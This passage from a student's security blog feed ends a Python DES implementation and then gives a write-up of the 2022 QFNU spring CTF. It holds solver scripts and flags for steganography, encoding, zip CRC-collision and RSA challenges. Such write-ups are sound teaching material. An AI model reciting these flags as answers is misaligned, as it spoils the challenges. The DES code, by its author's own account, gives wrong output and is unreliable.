class="token keyword">for</span> num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#16轮循环</span>    L <span class="token operator">=</span> R0    temp <span class="token operator">=</span> get_lastR<span class="token punctuation">(</span>K<span class="token punctuation">,</span>R0<span class="token punctuation">,</span>num<span class="token punctuation">)</span>    temp <span class="token operator">=</span> change<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    <span class="token comment">#改变一下格式，使temp和L0格式一样，方便实现异或运算</span>    R <span class="token operator">=</span> yihuo<span class="token punctuation">(</span>L0<span class="token punctuation">,</span>temp<span class="token punctuation">)</span>    L0 <span class="token operator">=</span> L    R0 <span class="token operator">=</span> Rmw <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#存放最终的L,R</span>mw<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>L<span class="token punctuation">)</span>mw<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>R<span class="token punctuation">)</span>rep <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"IP-1.txt"</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment">#进行最后一步逆置换并输出密文</span>miwen <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>linshi <span class="token operator">=</span> <span class="token string">''</span>new_miwen<span class="token operator">=</span><span class="token string">''</span>new_miwen2<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>rep<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>rep<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        linshi<span class="token operator">=</span>linshi<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>mw<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>rep<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>linshi<span class="token punctuation">)</span>new_miwen <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'.&#123;8&#125;'</span><span class="token punctuation">,</span> linshi<span class="token punctuation">)</span>str_1 <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> b <span class="token keyword">in</span> new_miwen<span class="token punctuation">:</span>    str_1 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str_1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后的结果实际上也是存在一些问题，在个人后面的验证中也没有找清楚问题出在了哪里？但是大致思路应该没问题</p><h3 id="文件读写操作">文件读写操作:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">my_read</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span>row<span class="token punctuation">,</span>col<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 读取各种矩阵----参数为文件名和目标矩阵的行列数</span>    sz <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>col<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> s1<span class="token punctuation">:</span>        lists <span class="token operator">=</span> s1<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>            <span class="token comment"># 以 , 将字符串分开</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sz<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                sz<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>    <span class="token keyword">return</span> sz    <span class="token comment"># 返回一个该矩阵的二维数组</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年QFNU春季赛WP</title>
      <link href="/2022/03/30/2021%E6%98%A5%E5%AD%A3%E8%B5%9BWP/"/>
      <url>/2022/03/30/2021%E6%98%A5%E5%AD%A3%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<h1 id="2022年春季赛WP"><a href="#2022年春季赛WP" class="headerlink" title="2022年春季赛WP"></a>2022年春季赛WP</h1><p>[TOC]</p><h2 id="1-MISC"><a href="#1-MISC" class="headerlink" title="1. MISC"></a>1. MISC</h2><h3 id="1-签到"><a href="#1-签到" class="headerlink" title="1.签到"></a>1.签到</h3><p>扫码得到flag</p><h3 id="2-签个到"><a href="#2-签个到" class="headerlink" title="2.签个到"></a>2.签个到</h3><p>base85解码,base32解码,base64解码，得到微信号（很明显看出）</p><blockquote><p>上面那个很明显看出是王文旭师哥写的，但是在师哥们在实验室出题的时候，我真没想出来，被王师哥坑道了，我以为是加密…….</p></blockquote><p>微信搜索好友，查看个性签名得到flag ,也是因为当时我们觉得这个签到，有点离谱，就又出了一道真签到。</p><h3 id="3-The-flag-is-under-the-picture"><a href="#3-The-flag-is-under-the-picture" class="headerlink" title="3.The flag is under the picture"></a>3.The flag is under the picture</h3><p>这一道题目，思路来自于在过去做过的一道，flag_under_the_picture和山东省科技节的一道大赛杂项。其实，在设计的时候稍微降了下难度，原题真的是图片隐写，但是考虑这次考察了一些其他内容，就在不在这一道题考察图片隐写，至于山东科技节的真题当时flag是两部分，一部分在文字类型里，另一部分则是隐藏文字。</p><p>这个算是一个签到(信息收集？)难度应该不大。</p><blockquote><p>1 under_the_picture，图片在word里的位置有很多种，环绕好像是最常见的，当时如果选择浮在文字之上就可以在图片下隐藏一些信息。</p><p>2 word实际上可以看做一个压缩包，我们可以在里面秘密的添加一些文件</p><p>3 在word下，我们可以更改字体格式为任意值，虽然这在显示中是默认值，但是字体名确实是你自定义的那些</p><p>4  隐藏文字，可以在word中设置显示隐藏文字</p></blockquote><p>flag{this_is_a_Sign_in_You_are_well}</p><blockquote><p>在这边师哥道歉下，我这次出题还是考虑不周，文档里面可以找到的所有信息和最后剩余的其实差了一个下划线_ ,虽然这种少下划线的平时做题也有，但这次我确实也没考虑这个，给师弟们放的Hint里面也误导了一些师弟…..</p></blockquote><h3 id="4-Virus-Killer"><a href="#4-Virus-Killer" class="headerlink" title="4.Virus_Killer"></a>4.Virus_Killer</h3><p>这是一道让所有 参赛选手都可以参与的题目，有谁能不喜欢我的世界呢？</p><p>我修改了包括终末之诗在内的一些内容，flag就在终末之诗里面，击败末影龙就能得到<strong>flag</strong>。</p><p>当然我觉得正常应该没人会是通过 杀死末影龙看到终末之诗吧，在配置文件里有一个 病毒杀手.jar用压缩包格式打开可以在里面找到终末之诗的配置文件，end</p><p>你会得到这一串</p><pre class="line-numbers language-none"><code class="language-none">§3恭喜你§2PLAYERNAME§3成功击败了冠状病毒§2来到了这里§3现在§2你将获得你的奖励§3仔细看§6ZmxhZ3tUaGVfdmlydXNfd2lsbF9wYXNzfQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>base64解码得到flag flag{The_virus_will_pass}</p><h3 id="5-拆红包"><a href="#5-拆红包" class="headerlink" title="5.拆红包"></a>5.拆红包</h3><p>Linux下binwalk分离，得到一个txt（41,21,33,45,11,14,13）<br>使用010改变图片高度(WORD Y_image)，下方为一个鼓，由此联想到敲击码打开文件，下面放一张敲击码图</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/%E5%A4%8D%E4%B9%A0/202203271009459.png"></p><h3 id="6-兔死who悲"><a href="#6-兔死who悲" class="headerlink" title="6.兔死who悲"></a>6.兔死who悲</h3><p>这个题，应该是来自王文旭师哥，兔吗，这很明显说的是rabbit密码，在图片中有一句我需要爆破，在比赛过程中，我们也放出了hint给出了zip-crc-cracker-master的下载地址</p><p>其实做出来的数量较我们的预期少了，因为提示给的很充足，使用binwalk -e分解图片可以得到flag.txt文件，这个是Rabbit加密的密文文件，在同时还存在一个加密文件夹，使用爆破跑是跑不出来的，这里需要crc碰撞</p><p>可以通过python3 crack.py key.zip简单得到解密秘钥(0_0)，解密得到flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;u_really_know_rabbits_and_crack&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="7-黑化的维亚"><a href="#7-黑化的维亚" class="headerlink" title="7.黑化的维亚"></a>7.黑化的维亚</h3><p>用stegsolve打开，查看不同色域下的图片</p><p><img src="https://s1.ax1x.com/2022/03/27/qwIgDf.png"></p><p>可以在相机的属性中找到序列号abcd，用abcd作为秘钥加密一次就得到flag。</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;wowowoheihuale!123&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="8-Retrieve-the-passcode"><a href="#8-Retrieve-the-passcode" class="headerlink" title="8.Retrieve_the_passcode"></a>8.Retrieve_the_passcode</h3><p>附件为一个rar文件和scatter.txt，从文件名入手，010内直接更改编辑。本题的scatter意思为散点，在MATLAB 为函数 在向量 x 和 y 指定的位置创建一个包含圆形的散点图。内数据格式为num,num,num;<br>使用Python处理数据，画出散点图即为压缩包密码（或直接暴力）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> mathlines <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"scatter.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>X <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>Y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>    x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    X<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    Y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> s<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlim<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylim<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开pdf为一串摩斯密码，解码得flag</p><h3 id="9-0和1的故事"><a href="#9-0和1的故事" class="headerlink" title="9.0和1的故事"></a>9.0和1的故事</h3><p>这个题的话我是套了以前做过的几个题，给大家添麻烦了，如果我没猜错的话，不少师弟师妹应该做过一个01字符串生成二维码的题目，师哥为了不让大家这么快获得flag，在外面套了一个base64转图片。因为得到是图片的形式了，后面的处理方式就看大家的脑洞。</p><p>基本上就是识图，生成01串，然后将他还原成二维码，这里还有个坑，我专门把标志位那块的01都换成了0，了解二维码的形状就能很轻松的将其复原。</p><p>这是一个0,1字符串生成二维码的脚本，没有实现的师弟师妹们可以看看</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagex <span class="token operator">=</span> <span class="token number">29</span>y <span class="token operator">=</span> <span class="token number">29</span>im <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span>white <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>black <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>        ff <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> ff<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>                im<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> black<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                im<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> white<span class="token punctuation">)</span>im<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当时我在看一个类似题目的题解的时候，有位大哥是有Excel完成的…..我觉得师弟中应该没有这样干的吧</p><h3 id="10-有手就行"><a href="#10-有手就行" class="headerlink" title="10.有手就行"></a>10.有手就行</h3><p>B.base64.txt里的编码内容是正确的flag</p><p>tp文件是png图片，文件尾部有提示的base64，解出来是a=1,b=1</p><p>使用脚本将一大串经过多次加密的base64解出来后是:gmbh{xf1d0nf_u0_cvhlv_}</p><p>结合a=1,b=2和仿射密码的特征，g前一位是f，m前一位是l，以此类推可以发现是仿射密码，打开仿射密码网站，将密文输进去，然后在a处输入1，b处输入即时正确的flag</p><p>最终flag是：<br>flag{we1c0me_t0_bugku_30}</p><p>脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64a <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'B.base64.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>b <span class="token operator">=</span> a<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    base64_de <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>base64_de<span class="token punctuation">)</span>    b <span class="token operator">=</span> base64_de    c<span class="token operator">+=</span><span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-CRYPTO"><a href="#2-CRYPTO" class="headerlink" title="2.CRYPTO"></a>2.CRYPTO</h2><h3 id="1-EzRSA"><a href="#1-EzRSA" class="headerlink" title="1.EzRSA"></a>1.EzRSA</h3><p>观察发现q是p的下一个素数，p和q相邻，考虑yafu分解n。 </p><p>p = 60973413304835230363868586902004006717237117044275222095949523787438821909233 </p><p>q = 60973413304835230363868586902004006717237117044275222095949523787438821908819 </p><p>接下来是正常rsa求解。 </p><p>exp： </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number<span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">import</span> gmpy2 p <span class="token operator">=</span> <span class="token number">60973413304835230363868586902004006717237117044275222095949523787438821909233</span>q <span class="token operator">=</span> <span class="token number">60973413304835230363868586902004006717237117044275222095949523787438821908819</span>e <span class="token operator">=</span> <span class="token number">65537</span>c <span class="token operator">=</span> <span class="token number">843360044490649635455345992345658516544479053731668488697835904926685148386299530843302273377684497428582758441622699787334991310590024330881454606434905</span> d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> q <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'flag&#123;crypto_1s_interesting&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-欧欧欧欧拉"><a href="#2-欧欧欧欧拉" class="headerlink" title="2.欧欧欧欧拉"></a>2.欧欧欧欧拉</h3><p><strong>方法一：</strong> </p><p>发现p，q，r均已给出，可以忽略题目中n的值，我们令n = p * q * r </p><p>然后就是正常求解 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> <span class="token number">77708508489582208240899650131902840854815755133475819112169579073727218368043</span>q <span class="token operator">=</span> <span class="token number">115346274621041699318908577704185761162067920193040258837922665578623979014737</span>r <span class="token operator">=</span> <span class="token number">93166107981326026645441213611016470699177795686294207640877308859576453989929</span>c <span class="token operator">=</span> <span class="token number">347985024400177502137432464900798540953635460694795945231855306625760961473332840686487124095862063998154167906085538622293374268339383930561570822025993330404000443189437185443891030627628783181063490300672242012327030487902957573259843362590656890086005064250511680034244728108117012676345214617621947005352669846702858611524555358875183335220452897059852086551237875454030210006489044067322848138770597108902534895893528585191491006543670911357584958970659151927090552495978448117307851072739865139783869799508202415340492688302276117064301995204992930822769693356655071714132128172897117903997013826512429240667259726064548860744384724715228197199073875301540485927036010254145447026303876803125148732898741913665524085357027</span> <span class="token number">545745800931501381715355480791801480897</span>e <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> p <span class="token operator">*</span> q <span class="token operator">*</span> r <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>方法二：</strong></p><p>我们也可以不更改n，利用欧拉函数的性质 </p><p>n = p ** 2 * q ** 3 * r ** 5 </p><p>phin = phi(p ** 2) * phi(q ** 3) * phi(r ** 5) = (p-1) * p * (q-1) * q * (r-1) * r**4 </p><p>exp: </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> <span class="token number">77708508489582208240899650131902840854815755133475819112169579073727218368043</span> q <span class="token operator">=</span> <span class="token number">115346274621041699318908577704185761162067920193040258837922665578623979014737</span> r <span class="token operator">=</span> <span class="token number">93166107981326026645441213611016470699177795686294207640877308859576453989929</span> c<span class="token operator">=</span><span class="token number">347985024400177502137432464900798540953635460694795945231855306625760961473332840686487124095862063998154167906085538622293374268339383930561570822025993330404000443189437185443891030627628783181063490300672242012327030487902957573259843362590656890086005064250511680034244728108117012676345214617621947005352669846702858611524555358875183335220452897059852086551237875454030210006489044067322848138770597108902534895893528585191491006543670911357584958970659151927090552495978448117307851072739865139783869799508202415340492688302276117064301995204992930822769693356655071714132128172897117903997013826512429240667259726064548860744384724715228197199073875301540485927036010254145447026303876803125148732898741913665524085357027545745800931501381715355480791801480897</span> n <span class="token operator">=</span> <span class="token number">65048551512240621993540614202950633661842586962192652824898395688184000402795957509481722751199080903392947991398273550047341785877223668123666842324877380470794846769076657730082614690182880900631464361441076132475928747991954627503106907777376357374758381806436260187733080114319610478685015082092970829089757587587993969952452971403572518192436602517670638053566510878431768966565133874950375020522410987166924387985858892891003579542248992692799457937156750952714742294212043332149687042398627353772231567346753462916369667925107827788291811362515610771720461320487626568153215009781929374220819616329622781459299058370744879472145087090461481538486760169932577206734789444604559973471107786087166188418189039013657392095931298017769281949143411358392051565393109553</span> e <span class="token operator">=</span> <span class="token number">65537</span> <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">import</span> gmpy2 phip <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> p phiq <span class="token operator">=</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> q<span class="token operator">**</span><span class="token number">2</span> phir <span class="token operator">=</span> <span class="token punctuation">(</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> r<span class="token operator">**</span><span class="token number">4</span> phi <span class="token operator">=</span> phip <span class="token operator">*</span> phiq <span class="token operator">*</span> phir d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#b'flag&#123;1_th1nk_you_get_1t&#125;'</span><span aria-hidden="true" 